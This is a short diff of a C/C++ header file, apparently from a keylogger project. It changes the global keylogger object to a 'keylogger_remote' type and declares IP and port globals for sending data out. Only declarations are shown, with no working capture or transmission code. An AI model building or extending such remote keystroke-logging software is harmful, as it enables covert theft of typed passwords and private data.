@@ -56,12 +56,13 @@ extern string* g_file_path;
 extern string* g_ip;
 extern int g_port;
 
-extern keylogger* g_keylogger;
+extern keylogger_remote* g_keylogger;
 
 void print_help();
 
 void initialize_options(int, char**);
 
-int main(int, char**);
+//int, char**
+int main();
 
 #endif
